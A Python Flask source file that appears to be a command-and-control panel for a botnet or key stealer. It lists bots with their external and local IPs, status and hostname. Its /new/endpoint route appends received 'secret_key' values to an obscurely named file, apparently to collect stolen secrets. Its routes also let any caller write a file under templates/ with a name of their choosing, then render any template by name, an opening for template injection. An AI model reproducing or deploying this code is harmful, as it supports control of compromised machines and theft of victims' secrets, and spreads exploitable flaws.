from flask import Flask, render_template, request, url_for, jsonify, redirect
from string import Template
from os import system

application = Flask(__name__, static_url_path = "", static_folder = "static/")

html_template = Template("""<head>
</head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" media="screen">
  </head>
  <title> Admin </title>
<table class='table'>
   <tr>
     <th>Bot</th>
     <th>IP External</th>
     <th>IP Local</th>
     <th>Status</th>
     <th>Hostname</th>
   </tr>
 </thead>
 <tbody>
    <tr>
      <td>${bot}</td>
      <td>${ip_external}</td>
      <td>${ip_local}</td>
      <td>${status}</td>
      <td>${hostname}</td>
    </tr>
  </tbody>
   </table>
""")

@application.route('/<key>', methods=['GET'])
def read_end(key):
    try:
        return(render_template(key))
    except:
        return("No")

@application.route('/<variable>', methods=['POST'])
def write_end(variable):
    input_json = request.get_json(force=True)
    with open('templates/{}'.format(variable), 'w') as a:
        a.writelines(html_template.substitute(bot=input_json['bot'],
         ip_external=input_json['ip_external'],
         ip_local=input_json['ip_local'],
         status=input_json['status'],
         hostname=input_json['hostname']))
    return("complete")

@application.route('/new/endpoint', methods=['POST'])
def my_test_endpoint():
    try:
        input_json = request.get_json(force=True)
        print(input_json)
        with open('jxtymctrhtnyfzcnhfybwf.html', 'a+') as f:
            f.write(input_json['secret_key'] + '\n')
            f.close()
        return ('complete')
    except:
        return('error')

if __name__ == '__main__':
    application.run(debug=False, use_reloader=True, host='0.0.0.0')
